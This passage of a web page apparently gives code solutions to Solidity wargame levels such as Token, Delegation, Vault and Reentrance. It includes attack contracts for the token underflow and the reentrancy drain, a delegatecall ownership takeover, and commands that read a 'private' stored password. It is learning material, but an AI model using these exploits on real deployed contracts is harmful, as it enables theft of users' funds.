        <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-</span> _value <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _value<span class="token punctuation">;</span>
        balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span> <span class="token operator">+=</span> _value<span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> _owner<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span> balance<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> balances<span class="token punctuation">[</span>_owner<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">Attack</span> <span class="token punctuation">{</span>
    Token t<span class="token punctuation">;</span>
    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _address<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        t <span class="token operator">=</span> <span class="token function">Token</span><span class="token punctuation">(</span>_address<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token builtin">address</span> _address<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _value<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> t<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>_address<span class="token punctuation">,</span> _value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="delegationwaz" tabindex="-1"><a class="header-anchor" href="#delegationwaz" aria-hidden="true">#</a> DelegationWaz</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">Delegate</span> <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _owner<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        owner <span class="token operator">=</span> _owner<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">Delegation</span> <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>
    Delegate delegate<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _delegateAddress<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        delegate <span class="token operator">=</span> <span class="token function">Delegate</span><span class="token punctuation">(</span>_delegateAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>
        <span class="token punctuation">(</span><span class="token builtin">bool</span> result<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span>delegate<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">contract</span><span class="token punctuation">.</span><span class="token function">sendTransaction</span><span class="token punctuation">(</span><span class="token punctuation">{</span>data<span class="token punctuation">:</span>web3<span class="token punctuation">.</span>utils<span class="token punctuation">.</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">&quot;pwn()&quot;</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="force" tabindex="-1"><a class="header-anchor" href="#force" aria-hidden="true">#</a> Force</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">Force</span> <span class="token punctuation">{</span> <span class="token comment">/*
                   MEOW ?
         /\\_/\\   /
    ____/ o o \\
    /~____  =ø= /
    (______)__m_m)
                   */</span> <span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">SelfDestruct</span> <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">payable</span> <span class="token keyword">public</span> beneficiary<span class="token punctuation">;</span>
    <span class="token builtin">uint</span> <span class="token keyword">public</span> balance <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _beneficiary<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        beneficiary <span class="token operator">=</span> _beneficiary<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>
        <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span>beneficiary<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">deposit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        balance <span class="token operator">+=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="vault" tabindex="-1"><a class="header-anchor" href="#vault" aria-hidden="true">#</a> Vault</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">Vault</span> <span class="token punctuation">{</span>
    <span class="token builtin">bool</span> <span class="token keyword">public</span> locked<span class="token punctuation">;</span>
    <span class="token builtin">bytes32</span> <span class="token keyword">private</span> password<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span> _password<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        locked <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        password <span class="token operator">=</span> _password<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span> _password<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>password <span class="token operator">==</span> _password<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            locked <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

# Palkeoramix decompiler<span class="token punctuation">.</span> 

def <span class="token keyword">storage</span><span class="token punctuation">:</span>
  locked <span class="token keyword">is</span> <span class="token builtin">uint8</span> at <span class="token keyword">storage</span> <span class="token number">0</span>
  stor1 <span class="token keyword">is</span> <span class="token builtin">uint256</span> at <span class="token keyword">storage</span> <span class="token number">1</span>

def <span class="token function">locked</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span><span class="token punctuation">:</span> 
  <span class="token keyword">return</span> <span class="token builtin">bool</span><span class="token punctuation">(</span>locked<span class="token punctuation">)</span>

#
#  Regular functions
#

def <span class="token function">_fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span><span class="token punctuation">:</span> # <span class="token keyword">default</span> <span class="token keyword">function</span>
  <span class="token keyword">revert</span>

def <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span> _param1<span class="token punctuation">)</span> <span class="token keyword">payable</span><span class="token punctuation">:</span> 
  <span class="token keyword">require</span> <span class="token keyword">calldata</span><span class="token punctuation">.</span>size <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">&gt;=</span>ΓÇ▓ <span class="token number">32</span>
  <span class="token keyword">if</span> stor1 <span class="token operator">==</span> _param1<span class="token punctuation">:</span>
      locked <span class="token operator">=</span> <span class="token number">0</span>

await web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span><span class="token function">getStorageAt</span><span class="token punctuation">(</span><span class="token string">&#39;0xcEa1acfA4617E8Bb870Ba3e381599BcC59406c4A&#39;</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
await <span class="token keyword">contract</span><span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token string">&#39;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&#39;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="king" tabindex="-1"><a class="header-anchor" href="#king" aria-hidden="true">#</a> King</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">King</span> <span class="token punctuation">{</span>
    <span class="token builtin">address</span> king<span class="token punctuation">;</span>
    <span class="token builtin">uint256</span> <span class="token keyword">public</span> prize<span class="token punctuation">;</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
        king <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
        prize <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">&gt;=</span> prize <span class="token operator">||</span> msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">payable</span><span class="token punctuation">(</span>king<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        king <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
        prize <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">_king</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> king<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="reentrance" tabindex="-1"><a class="header-anchor" href="#reentrance" aria-hidden="true">#</a> Reentrance</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>

<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */</span>
<span class="token keyword">library</span> <span class="token class-name">SafeMath</span> <span class="token punctuation">{</span>

  <span class="token comment">/**
  * @dev Multiplies two numbers, throws on overflow.
  */</span>
  <span class="token keyword">function</span> <span class="token function">mul</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> a<span class="token punctuation">,</span> <span class="token builtin">uint256</span> b<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span> c<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    c <span class="token operator">=</span> a <span class="token operator">*</span> b<span class="token punctuation">;</span>
    <span class="token keyword">assert</span><span class="token punctuation">(</span>c <span class="token operator">/</span> a <span class="token operator">==</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> c<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">/**
  * @dev Integer division of two numbers, truncating the quotient.
  */</span>
  <span class="token keyword">function</span> <span class="token function">div</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> a<span class="token punctuation">,</span> <span class="token builtin">uint256</span> b<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// assert(b &gt; 0); // Solidity automatically throws when dividing by 0</span>
    <span class="token comment">// uint256 c = a / b;</span>
    <span class="token comment">// assert(a == b * c + a % b); // There is no case in which this doesn&#39;t hold</span>
    <span class="token keyword">return</span> a <span class="token operator">/</span> b<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">/**
  * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */</span>
  <span class="token keyword">function</span> <span class="token function">sub</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> a<span class="token punctuation">,</span> <span class="token builtin">uint256</span> b<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">assert</span><span class="token punctuation">(</span>b <span class="token operator">&lt;=</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> a <span class="token operator">-</span> b<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">/**
  * @dev Adds two numbers, throws on overflow.
  */</span>
  <span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> a<span class="token punctuation">,</span> <span class="token builtin">uint256</span> b<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span> c<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    c <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>
    <span class="token keyword">assert</span><span class="token punctuation">(</span>c <span class="token operator">&gt;=</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> c<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">Reentrance</span> <span class="token punctuation">{</span>
    <span class="token keyword">using</span> <span class="token class-name">SafeMath</span> <span class="token keyword">for</span> <span class="token builtin">uint256</span><span class="token punctuation">;</span>

    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">donate</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span> <span class="token operator">=</span> balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> _who<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span> balance<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> balances<span class="token punctuation">[</span>_who<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> _amount<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token punctuation">(</span><span class="token builtin">bool</span> result<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">{</span>value<span class="token punctuation">:</span> _amount<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                _amount<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _amount<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">Attack</span> <span class="token punctuation">{</span>
    Reentrance re<span class="token punctuation">;</span>
    <span class="token builtin">uint</span> <span class="token keyword">public</span> attackAmount<span class="token punctuation">;</span>
    <span class="token keyword">event</span> <span class="token function">Withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _re<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        re <span class="token operator">=</span> <span class="token function">Reentrance</span><span class="token punctuation">(</span>_re<span class="token punctuation">)</span><span class="token punctuation">;</span>
        attackAmount <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span>re<span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        re<span class="token punctuation">.</span>donate<span class="token punctuation">{</span>value<span class="token punctuation">:</span> attackAmount<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token punctuation">{</span>
        re<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span>attackAmount<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">emit</span> <span class="token function">Withdraw</span><span class="token punctuation">(</span>attackAmount<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="elevator" tabindex="-1"><a class="header-anchor" href="#elevator" aria-hidden="true">#</a> Elevator</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">interface</span> <span class="token class-name">Building</span> <span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">isLastFloor</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">Elevator</span> <span class="token punctuation">{</span>
    <span class="token builtin">bool</span> <span class="token keyword">public</span> top<span class="token punctuation">;</span>
    <span class="token builtin">uint256</span> <span class="token keyword">public</span> floor<span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">goTo</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _floor<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        Building building <span class="token operator">=</span> <span class="token function">Building</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>building<span class="token punctuation">.</span><span class="token function">isLastFloor</span><span class="token punctuation">(</span>_floor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            floor <span class="token operator">=</span> _floor<span class="token punctuation">;</span>
